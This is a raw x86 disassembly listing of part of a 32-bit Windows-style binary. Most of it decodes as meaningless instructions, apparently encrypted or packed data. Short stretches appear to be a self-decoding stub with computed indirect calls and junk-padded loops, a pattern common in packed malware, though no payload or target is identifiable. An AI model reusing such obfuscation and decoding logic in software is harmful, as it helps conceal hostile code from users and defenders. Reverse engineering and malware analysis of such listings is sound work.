  4072c4:	sbb    eax,0xe589c1ab
  4072c9:	or     ebp,DWORD PTR [edi]
  4072cb:	ficomp WORD PTR [edx]
  4072cd:	push   edx
  4072ce:	lds    ecx,FWORD PTR [ebx+0x6c9328e9]
  4072d4:	sbb    eax,0xd21383b5
  4072d9:	and    al,0x51
  4072db:	xchg   edi,eax
  4072dc:	add    DWORD PTR [edx-0xf6d8797],ecx
  4072e2:	fldenv [esi-0x1f46a568]
  4072e8:	test   al,0x55
  4072ea:	xchg   ebp,eax
  4072eb:	xchg   ecx,eax
  4072ec:	mov    ebp,0x7e2407e
  4072f1:	jp     0x4072be
  4072f3:	cs jg  0x40727c
  4072f6:	jmp    0xbe14024c
  4072fb:	out    0xb4,al
  4072fd:	xchg   edx,eax
  4072fe:	mov    ds:0xed81a619,al
  407303:	lock in al,0xaa
  407306:	sub    BYTE PTR [edi-0x1042c941],dl
  40730c:	out    0xf,al
  40730e:	lea    ecx,[esi-0x32]
  407311:	mov    ecx,0xa3e627ed
  407316:	imul   edx,DWORD PTR [esi],0xffffffa3
  407319:	sub    BYTE PTR [edi-0x6541720c],ch
  40731f:	imul   esi,DWORD PTR [bp+di+0x26be],0xfffffffe
  407325:	dec    BYTE PTR [ebx+0x2e]
  407328:	push   es
  407329:	addr16 jo 0x407302
  40732c:	cmp    ah,BYTE PTR [ebx+edi*1]
  40732f:	out    0x61,eax
  407331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407332:	add    DWORD PTR [ebp+0x9],0xffffff86
  407336:	adc    BYTE PTR [esi-0x5c],bl
  407339:	out    0x47,eax
  40733b:	jmp    0xdb5c6372
  407340:	jle    0x407396
  407342:	sub    cl,ah
  407344:	push   ds
  407345:	(bad)  
  407346:	loope  0x40739f
  407348:	outs   dx,BYTE PTR ds:[esi]
  407349:	call   0xd05af7a6
  40734e:	enter  0xba19,0x87
  407352:	(bad)  
  407353:	xor    al,0x69
  407355:	cmp    esp,0x72ca764b
  40735b:	lods   al,BYTE PTR ds:[esi]
  40735c:	mov    esi,eax
  40735e:	pop    ss
  40735f:	fst    QWORD PTR [ebx-0x49]
  407362:	iret   
  407363:	ja     0x407376
  407365:	addr16 cdq 
  407367:	xchg   ebx,eax
  407368:	nop
  407369:	and    eax,DWORD PTR [edi+0x200ef0a7]
  40736f:	in     eax,0x1
  407371:	cmp    bl,0x16
  407374:	xchg   edx,eax
  407375:	fnsave [ecx-0x762cd84b]
  40737b:	(bad)  
  40737c:	jns    0x4073f5
  40737e:	xchg   edi,eax
  40737f:	pop    esi
  407380:	test   DWORD PTR [esi+0x16a768e2],ecx
  407386:	sub    al,0xb6
  407388:	cmp    DWORD PTR [ebx+ecx*2],0xffffffe0
  40738c:	pop    edx
  40738d:	outs   dx,BYTE PTR ds:[esi]
  40738e:	pop    esi
  40738f:	jp     0x40731c
  407391:	sbb    BYTE PTR [eax-0xffffff],0x30
  407398:	call   0x40d076
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	pop    es
  4073e0:	stos   DWORD PTR es:[edi],eax
  4073e1:	imul   eax,ebp,0x7070c1ab
  4073e7:	and    BYTE PTR [ebp+0x70],bh
  4073ea:	jo     0x4073db
  4073ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073ed:	in     eax,dx
  4073ee:	cmp    ebx,esp
  4073f0:	(bad)  
  4073f1:	cmp    edi,DWORD PTR [esi+0x7f]
  4073f4:	in     al,dx
  4073f5:	paddd  mm3,QWORD PTR [esi]
  4073f8:	add    eax,0x22df7eed
  4073fd:	mov    gs,esi
  4073ff:	pusha  
  407400:	mov    eax,ds:0xd3274e5e
  407405:	add    eax,0xbb8ad9a0
  40740a:	int3   
  40740b:	xchg   BYTE PTR [ebp+0x1191cfd4],cl
  407411:	dec    eax
  407412:	das    
  407413:	or     dl,BYTE PTR [ecx-0x2]
  407416:	ficom  WORD PTR [eax+0x652051b5]
  40741c:	call   0x78334ef1
  407421:	adc    DWORD PTR [edi],esi
  407423:	jmp    0xb603bc41
  407428:	repz push esi
  40742a:	pop    es
  40742b:	push   ds
  40742c:	jle    0x407440
  40742e:	ud0    ebx,DWORD PTR [edx]
  407431:	test   al,dl
  407433:	pop    ebx
  407434:	clc    
  407435:	outs   dx,BYTE PTR ds:[esi]
  407436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407437:	mov    ch,BYTE PTR [ebp+0x16dfc229]
  40743d:	iret   
  40743e:	jl     0x4073f7
  407440:	scas   eax,DWORD PTR es:[edi]
  407441:	mov    BYTE PTR [edx+ecx*8+0x7f9dbd87],0xef
  407449:	jno    0x407458
  40744b:	mov    ecx,0xb077aed8
  407450:	jmp    0x40742e
  407452:	push   0x64ec65d0
  407457:	neg    ch
  407459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40745a:	xchg   edi,eax
  40745b:	fmul   DWORD PTR [eax-0x235d6894]
  407461:	repnz sahf 
  407463:	enter  0xad1,0x47
  407467:	popa   
  407468:	sbb    BYTE PTR [ebx+0x6d],cl
  40746b:	cmc    
  40746c:	mov    bh,0x18
  40746e:	sub    ecx,esi
  407470:	push   ecx
  407471:	xor    al,0xae
  407473:	cmc    
  407474:	xor    eax,0x2c1d14e1
  407479:	mov    bh,0x9
  40747b:	fcomp  DWORD PTR [eax+ecx*2-0x18c1303f]
  407482:	rol    BYTE PTR ds:0x2d1b73b8,cl
  407488:	cmp    cl,BYTE PTR [ebx-0x3aa03c83]
  40748e:	adc    esp,DWORD PTR [ebp+0x3f43c4ba]
  407494:	pop    esi
  407495:	ret    0x84cc
  407498:	inc    edi
  407499:	out    dx,eax
  40749a:	pop    edx
  40749b:	xlat   BYTE PTR ds:[ebx]
  40749c:	(bad)  
  40749d:	into   
  40749e:	(bad)  
  40749f:	add    DWORD PTR [ebp+0x7eed29e5],edx
  4074a5:	inc    esp
  4074a6:	push   es
  4074a7:	imul   edx,esi,0xb3124152
  4074ad:	push   0xffffffd3
  4074af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b0:	mov    bh,0x66
  4074b2:	adc    ebx,DWORD PTR [ecx]
  4074b4:	out    dx,eax
  4074b5:	sbb    bl,BYTE PTR [ebp-0x57]
  4074b8:	loope  0x4074e2
  4074ba:	cmp    DWORD PTR ds:0x526bf642,edx
  4074c0:	xor    DWORD PTR [eax-0x6f],esp
  4074c3:	ja     0x4074f3
  4074c5:	fistp  WORD PTR [ebx-0x65]
  4074c8:	cmp    DWORD PTR [edx+0x25],esp
  4074cb:	or     BYTE PTR [bx+0x70],dh
  4074cf:	xor    dl,BYTE PTR ds:0xb3c924b3
  4074d5:	mov    esp,0xbce2722f
  4074da:	mov    bl,0xf
  4074dc:	mov    esi,edi
  4074de:	js     0x407485
  4074e0:	xor    al,0xd9
  4074e2:	bound  eax,QWORD PTR ss:[ebp-0x57]
  4074e6:	es jmp 0x4074c7
  4074e9:	mov    bh,0xa2
  4074eb:	ret    
  4074ec:	fnstsw WORD PTR [ebp+0x6d]
  4074ef:	dec    ecx
  4074f0:	mov    eax,gs:0x3d9f7a34
  4074f6:	leave  
  4074f7:	loopne 0x407499
  4074f9:	mov    esi,0x35ada1cb
  4074fe:	fist   DWORD PTR [ecx]
  407500:	adc    DWORD PTR [ecx+0x574cac9d],ebx
  407506:	into   
  407507:	test   al,0x9e
  407509:	sub    al,BYTE PTR [ebp-0x388c3ccc]
  40750f:	aas    
  407510:	mov    WORD PTR [edi-0x32],es
  407513:	push   0xffffff89
  407515:	pushf  
  407516:	and    al,0xe4
  407518:	mov    bh,ch
  40751a:	hlt    
  40751b:	sbb    BYTE PTR [edi+0xd33731a],dl
  407521:	int3   
  407522:	lods   al,BYTE PTR ds:[esi]
  407523:	pop    ecx
  407524:	dec    esi
  407525:	add    ah,BYTE PTR [edx]
  407527:	dec    esi
  407528:	retf   
  407529:	cmp    BYTE PTR ds:0x27e1b335,dl
  40752f:	sbb    eax,0x8f23efc5
  407534:	xor    eax,0xfe100e29
  407539:	jecxz  0x40750c
  40753b:	or     DWORD PTR [esp+ecx*2+0x6a],eax
  40753f:	iret   
  407540:	mov    esp,0x71bd1cc
  407545:	xor    ch,ah
  407547:	adc    BYTE PTR [edi-0x65eb9d79],bl
  40754d:	push   esi
  40754e:	adc    BYTE PTR [ecx-0x40],cl
  407551:	jle    0x407596
  407553:	pop    ecx
  407554:	mov    BYTE PTR [ebp-0x63cfd33e],cl
  40755a:	test   DWORD PTR fs:[edi-0x4e18f24b],eax
  407561:	and    al,0x7c
  407563:	sub    eax,0xa37598ce
  407568:	dec    esp
  407569:	jnp    0x4074eb
  40756b:	mov    esp,0x5df4f6cb
  407570:	retf   
  407571:	pop    ecx
  407572:	dec    ecx
  407573:	inc    ebx
  407574:	fcomip st,st(3)
  407576:	js     0x4075f5
  407578:	sti    
  407579:	(bad)  
  40757a:	push   cs
  40757b:	cli    
  40757c:	pop    edi
  40757d:	pop    ebp
  40757e:	test   BYTE PTR [edi],ch
  407580:	jns    0x4075f0
  407582:	jmp    0x19d5:0x25b7e4e3
  407589:	inc    ebx
  40758a:	add    ebx,DWORD PTR [ebp-0x7cf08f81]
  407590:	sub    BYTE PTR [edx-0x74],ah
  407593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407594:	jno    0x4075b1
  407596:	mov    al,0x7d
  407598:	pop    es
  407599:	addr16 mov ds:0xe31e,al
  40759d:	mov    gs,WORD PTR [edi]
  40759f:	(bad)  
  4075a0:	repz ss popf 
  4075a3:	nop
  4075a4:	test   DWORD PTR [ecx+0x29],ebx
  4075a7:	jmp    0xcace:0x16bfec4e
  4075ae:	add    eax,0x1fa0479
  4075b3:	rcr    BYTE PTR [esi+0x46],1
  4075b6:	jp     0x40762f
  4075b8:	mov    WORD PTR [edi+0x19dcb43c],ss
  4075be:	dec    esp
  4075bf:	test   ebp,0xbe5c55e9
  4075c5:	dec    edi
  4075c6:	pushf  
  4075c7:	dec    esp
  4075c8:	add    BYTE PTR [ebp-0x72],bl
  4075cb:	dec    edx
  4075cc:	int3   
  4075cd:	or     al,0xe1
  4075cf:	lods   eax,DWORD PTR ds:[esi]
  4075d0:	cmp    ebp,0xffffffbe
  4075d3:	iret   
  4075d4:	or     edi,DWORD PTR [eax-0x12832468]
  4075da:	ror    DWORD PTR [edx],1
  4075dc:	and    edi,edi
  4075de:	jp     0x4075f6
  4075e0:	aad    0xb2
  4075e2:	out    dx,al
  4075e3:	adc    al,0x68
  4075e5:	sbb    ebx,DWORD PTR [edi+0x5e]
  4075e8:	push   ss
  4075e9:	jnp    0x40763e
  4075eb:	dec    edx
  4075ec:	push   eax
  4075ed:	xor    BYTE PTR [edx-0x69],ah
  4075f0:	js     0x4075bb
  4075f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f3:	jle    0x407667
  4075f5:	ds and eax,0x799d1ad1
  4075fb:	repnz xchg esp,eax
  4075fd:	inc    BYTE PTR [ecx-0x52]
  407600:	cmp    BYTE PTR [ebp+0x29c58847],dh
  407606:	push   0xffffff9f
  407608:	ds in  eax,dx
  40760a:	mov    DWORD PTR [ebx-0x7f],edx
  40760d:	mov    dh,BYTE PTR [esi+ebp*8-0x50b7a524]
  407614:	sub    edx,0xffffff9d
  407617:	cwde   
  407618:	or     ecx,DWORD PTR [edx+0x6f]
  40761b:	sahf   
  40761c:	popa   
  40761d:	cmp    dl,bh
  40761f:	cs ins BYTE PTR es:[edi],dx
  407621:	sbb    al,0x86
  407623:	add    DWORD PTR [eax-0x29d3ccda],esp
  407629:	(bad)  
  40762a:	int    0x7a
  40762c:	scas   eax,DWORD PTR es:[edi]
  40762d:	test   BYTE PTR [edx-0x5b3eeca2],dh
  407633:	push   edx
  407634:	mov    edi,0x31006c5
  407639:	mov    cl,0xe2
  40763b:	(bad)  
  40763c:	sahf   
  40763d:	jmp    0x6904:0xd5ad039c
  407644:	sbb    cl,BYTE PTR [edx-0x7b]
  407647:	cmp    cl,dl
  407649:	mov    dl,0x63
  40764b:	clc    
  40764c:	or     BYTE PTR [di-0x2308],dh
  407651:	pop    ds
  407652:	icebp  
  407653:	push   ds
  407654:	mov    dl,0x86
  407656:	mov    ch,0x15
  407658:	and    al,BYTE PTR [edx]
  40765a:	out    0x14,eax
  40765c:	add    BYTE PTR [esi],bl
  40765e:	mov    ds:0xe4d0b3,al
  407663:	mov    ds:0xfc181966,al
  407668:	jg     0x40765b
  40766a:	stos   BYTE PTR es:[edi],al
  40766b:	aad    0x84
  40766d:	jbe    0x407697
  40766f:	mov    cl,0xcd
  407671:	dec    ecx
  407672:	mov    BYTE PTR [edx+0x64],ch
  407675:	sar    DWORD PTR [ecx],cl
  407677:	jb     0x407642
  407679:	xor    DWORD PTR [ebp-0x3f638aa1],ebx
  40767f:	aas    
  407680:	mov    ah,0x2f
  407682:	out    dx,eax
  407683:	adc    BYTE PTR [esp+edx*4],0x5f
  407687:	sar    BYTE PTR [esi+0x16],1
  40768a:	outs   dx,BYTE PTR ds:[esi]
  40768b:	xor    eax,0x4caa8947
  407690:	cmp    eax,0x8354062b
  407695:	cmp    eax,0x749e33ca
  40769a:	test   al,0x4c
  40769c:	jg     0x4076c3
  40769e:	xor    al,BYTE PTR [esi+0x7295582f]
  4076a4:	mov    eax,ds:0xa9ac885c
  4076a9:	shr    DWORD PTR [esp+ebx*8],1
  4076ac:	mov    esi,0xd1e196cb
  4076b1:	inc    edi
  4076b2:	xchg   ecx,eax
  4076b3:	scas   al,BYTE PTR es:[edi]
  4076b4:	mov    ch,0xd1
  4076b6:	scas   al,BYTE PTR es:[edi]
  4076b7:	js     0x407653
  4076b9:	test   BYTE PTR [ebx+0x66183b5],dl
  4076bf:	in     al,dx
  4076c0:	js     0x40764c
  4076c2:	cdq    
  4076c3:	adc    bh,ah
  4076c5:	icebp  
  4076c6:	xchg   ebx,eax
  4076c7:	push   ss
  4076c8:	dec    esi
  4076c9:	in     eax,0xca
  4076cb:	test   eax,0xa6166cc2
  4076d0:	in     eax,dx
  4076d1:	xchg   ebp,eax
  4076d2:	out    0x2f,eax
  4076d4:	icebp  
  4076d5:	call   0x6b05f881
  4076da:	push   eax
  4076db:	addr16 inc ebp
  4076dd:	and    al,0x9c
  4076df:	js     0x4076ee
  4076e1:	cmp    esi,eax
  4076e3:	in     al,dx
  4076e4:	ins    BYTE PTR es:[edi],dx
  4076e5:	pop    ecx
  4076e6:	xchg   edi,eax
  4076e7:	mov    dl,0xef
  4076e9:	dec    ecx
  4076ea:	mov    BYTE PTR [edi],al
  4076ec:	repnz pop eax
  4076ee:	add    BYTE PTR [edx+0x1d6c9bd5],0x9a
  4076f5:	rcr    DWORD PTR [esi],1
  4076f7:	ins    BYTE PTR es:[edi],dx
  4076f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f9:	pop    ebp
  4076fa:	xor    esi,esp
  4076fc:	cmp    al,0x4b
  4076fe:	stos   DWORD PTR es:[edi],eax
  4076ff:	xchg   DWORD PTR [edx-0x264adf2c],eax
  407705:	cmp    ch,BYTE PTR ds:0xfedcaac8
  40770b:	stos   BYTE PTR es:[edi],al
  40770c:	int    0x3b
  40770e:	lahf   
  40770f:	and    ecx,DWORD PTR [ebp+0x15]
  407712:	(bad)  
  407713:	mul    ebx
  407715:	mov    eax,ds:0xfc53be2
  40771a:	mov    edi,esi
  40771c:	or     bh,bh
  40771e:	jne    0x407710
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434419,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432e64
  40777b:	mov    edi,DWORD PTR ds:0x434449
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432de6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434366
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4326ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4326ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4326ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4326ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434421
  4077dc:	call   DWORD PTR ds:0x4329ca
  4077e2:	cmp    DWORD PTR ds:0x4326ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4326ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4326ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4326ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432dde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43436e
  40782a:	or     DWORD PTR ds:0x4326fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434415,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432700,0x434392
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4326ec
  407850:	or     edi,DWORD PTR ds:0x4326f0
  407856:	mov    DWORD PTR ds:0x4326ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434425,0x1e
  407871:	cmp    DWORD PTR ds:0x434425,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434425,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432cf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434425
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434425,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4343a6
  4078ab:	mov    edi,DWORD PTR ds:0x434469
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	and    eax,0x5b06aa73
  4078cc:	into   
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0xf7880670
  4078d6:	mov    ecx,DWORD PTR [esi]
  4078d8:	sbb    al,0xb6
  4078da:	ret    0x849a
  4078dd:	jge    0x40786d
  4078df:	ss stc 
  4078e1:	ds aas 
  4078e3:	cld    
  4078e4:	data16 scas al,BYTE PTR es:[edi]
  4078e6:	popf   
  4078e7:	push   ds
  4078e8:	sub    al,0xcc
  4078ea:	cmp    edx,DWORD PTR [edi+eax*4-0x65]
  4078ee:	pop    ds
  4078ef:	pop    es
  4078f0:	pop    ecx
  4078f2:	jnp    0x407973
  4078f4:	ins    BYTE PTR es:[edi],dx
  4078f5:	push   ebx
  4078f6:	clc    
  4078f7:	or     al,BYTE PTR [ebx+eiz*1+0x65867419]
  4078fe:	lahf   
  4078ff:	xchg   ebx,eax
  407900:	adc    cl,BYTE PTR [edi-0x1a9c2087]
  407906:	mov    dh,0x2
  407908:	loop   0x40796b
  40790a:	jmp    0x54a9:0x91f315b1
  407911:	bound  ecx,QWORD PTR [eax+0x439f6ab9]
  407917:	lods   al,BYTE PTR ds:[esi]
  407918:	dec    esi
  407919:	test   BYTE PTR [edx-0x1f],ch
  40791c:	xor    edi,0x22
  40791f:	mov    ecx,0x13975e11
  407924:	out    dx,al
  407925:	xchg   DWORD PTR [ebx],eax
  407927:	in     eax,dx
  407928:	cmp    eax,0xb0d80982
  40792d:	inc    edi
  40792e:	sub    al,0xa7
  407930:	adc    al,0x5c
  407932:	sub    eax,DWORD PTR [ebx+0x5f]
  407935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407936:	cmc    
  407937:	retf   
  407938:	lock and eax,0x58aa0c4b
  40793e:	mov    ebp,0x75cb8926
  407943:	out    dx,eax
  407944:	mov    eax,0x674bffe
  407949:	loope  0x4078f0
  40794b:	(bad)  
  40794c:	outs   dx,DWORD PTR ds:[esi]
  40794d:	cwde   
  40794e:	fmulp  st(5),st
  407950:	pop    ebp
  407951:	(bad)  
  407952:	loop   0x4079b0
  407954:	scas   eax,DWORD PTR es:[edi]
  407955:	cdq    
  407956:	xchg   ebp,eax
  407957:	cmp    bl,BYTE PTR [edx+0x2d]
  40795a:	mov    eax,0xf6ca5c9c
  40795f:	fidivr DWORD PTR [esi-0x3b]
  407962:	add    ecx,DWORD PTR [ecx+0x73898e87]
  407968:	mov    eax,ds:0x9ea34be9
  40796d:	gs movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  407970:	lds    edi,FWORD PTR [ebp-0x58]
  407973:	shl    DWORD PTR [ebx],0xea
  407976:	or     al,0xfd
  407978:	fwait
  407979:	outs   dx,DWORD PTR ds:[esi]
  40797a:	ins    BYTE PTR es:[edi],dx
  40797b:	xchg   ecx,eax
  40797c:	dec    ecx
  40797d:	fdiv   QWORD PTR [esi-0x2e3ddc3]
  407983:	xchg   esi,eax
  407984:	fild   DWORD PTR [edx-0x3b19d064]
  40798a:	inc    esp
  40798b:	sbb    eax,0x15aaa66f
  407990:	dec    esi
  407991:	mov    al,ds:0xaad3da29
  407996:	lods   al,BYTE PTR ds:[esi]
  407997:	pop    ebx
  407998:	pop    esp
  407999:	outs   dx,BYTE PTR ds:[esi]
  40799a:	jg     0x407980
  40799c:	xor    dl,BYTE PTR [esi-0x641607e8]
  4079a2:	(bad)  
  4079a3:	push   0x18a5def4
  4079a8:	pusha  
  4079a9:	retf   0x96
  4079ac:	or     BYTE PTR [eax+0x35208673],bh
  4079b2:	shr    BYTE PTR [edx],1
  4079b4:	dec    edx
  4079b5:	adc    BYTE PTR [ebx-0x2b],0x98
  4079b9:	sbb    eax,0x144a005b
  4079be:	in     al,dx
  4079bf:	fiadd  WORD PTR [esi]
  4079c1:	mov    ch,0x3b
  4079c3:	es out 0x7c,al
  4079c6:	sub    al,0x12
  4079c8:	outs   dx,DWORD PTR ds:[esi]
  4079c9:	cmp    eax,0x3b86a624
  4079ce:	push   esi
  4079cf:	lods   eax,DWORD PTR ds:[esi]
  4079d0:	jb     0x407a3e
  4079d2:	cmp    DWORD PTR [esi+0x5ba099e0],edi
  4079d8:	(bad)  
  4079d9:	pushf  
  4079da:	jmp    0xe2d5:0xebff5257
  4079e1:	xor    DWORD PTR [ebp-0x269c8680],edi
  4079e7:	arpl   WORD PTR [eax+0x4],si
  4079ea:	jb     0x407a67
  4079ec:	gs pop edx
  4079ee:	retf   0x9dca
  4079f1:	adc    DWORD PTR [ecx+eiz*1],ecx
  4079f4:	jbe    0x407a51
  4079f6:	arpl   WORD PTR es:[ecx+ecx*4+0x7abd5d44],sp
  4079fe:	js     0x4079a1
  407a00:	jmp    0x407995
  407a02:	retf   
  407a03:	push   ebp
  407a04:	fwait
  407a05:	push   cs
  407a06:	sub    BYTE PTR [edx],dl
  407a08:	aaa    
  407a09:	cmc    
  407a0a:	push   cs
  407a0b:	lods   al,BYTE PTR ds:[esi]
  407a0c:	or     dh,cl
  407a0e:	dec    ecx
  407a0f:	es ds mov edi,0x1c5b13ac
  407a16:	retf   0x5f77
  407a19:	pop    ss
  407a1a:	daa    
  407a1b:	cmp    DWORD PTR [edi+0x5374bc30],ecx
  407a21:	push   ebx
  407a22:	in     al,0x6d
  407a24:	xor    ch,0xdf
  407a27:	push   ds
  407a28:	stos   BYTE PTR es:[edi],al
  407a29:	aam    0x99
  407a2b:	inc    esi
  407a2c:	int    0x6a
  407a2e:	sbb    eax,0x1a0dc496
  407a33:	cmc    
  407a34:	es sahf 
  407a36:	mov    ebx,0xbda8ad16
  407a3b:	jecxz  0x407a6f
  407a3d:	ret    0xc029
  407a40:	pop    ebx
  407a41:	in     eax,0xb4
  407a43:	stos   BYTE PTR es:[edi],al
  407a44:	xor    al,0xc5
  407a46:	je     0x407a6b
  407a48:	rcl    BYTE PTR [edi+0x73],0xd1
  407a4c:	daa    
  407a4d:	mov    es,WORD PTR [edx]
  407a4f:	out    0xab,eax
  407a51:	leave  
  407a52:	xchg   ebp,eax
  407a53:	add    bl,bh
  407a55:	nop
  407a56:	inc    edx
  407a57:	mov    al,0x4e
  407a59:	and    dl,dl
  407a5b:	rcr    edi,0x5f
  407a5e:	les    ebx,FWORD PTR [edx+0xb]
  407a61:	jge    0x407a2a
  407a63:	in     eax,0x2f
  407a65:	mov    ebp,0x9796c12a
  407a6a:	rcr    BYTE PTR [ebp+0x36],1
  407a6d:	ds jns 0x407a7d
  407a70:	inc    ebx
  407a71:	add    BYTE PTR [esi+0x72e7dbbb],dl
  407a77:	inc    ebx
  407a78:	push   cs
  407a79:	mov    ds:0x4ae47ef8,eax
  407a7e:	dec    edx
  407a7f:	pop    esp
  407a80:	iret   
  407a81:	inc    ecx
  407a82:	push   edi
  407a83:	sbb    dl,dl
  407a85:	xchg   esp,eax
  407a86:	stos   BYTE PTR es:[edi],al
  407a87:	shr    DWORD PTR [ebx],1
  407a89:	cmp    al,0x3e
  407a8b:	push   ebx
  407a8c:	shl    BYTE PTR [esi+0xb5ba600],0xf4
  407a93:	mov    al,ds:0x4dc421ef
  407a98:	adc    al,0xa4
  407a9a:	(bad)  
  407a9b:	pop    ebp
  407a9c:	ins    DWORD PTR es:[edi],dx
  407a9d:	int    0x51
  407a9f:	stos   DWORD PTR es:[edi],eax
  407aa0:	stos   DWORD PTR es:[edi],eax
  407aa1:	mov    ds:0xd3730bd7,al
  407aa6:	addr16 fs xchg esi,eax
  407aa9:	mov    WORD PTR [ebx-0x483c21c4],gs
  407aaf:	jb     0x407ac2
  407ab1:	into   
  407ab2:	inc    edi
  407ab3:	popf   
  407ab4:	sahf   
  407ab5:	xchg   edi,eax
  407ab6:	(bad)  [ecx-0x41201baa]
  407abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407abd:	ss pop esp
  407abf:	sub    esi,ebp
  407ac1:	jnp    0x407b38
  407ac3:	sub    ecx,DWORD PTR [ecx+0x2a36a782]
  407ac9:	push   ds
  407aca:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  407ad1:	add    edx,DWORD PTR ds:0x432dce
  407ad7:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  407ade:	mov    edi,DWORD PTR ds:0x43436a
  407ae4:	sub    DWORD PTR ds:0x434372,edi
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434425,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi-0x52804807]
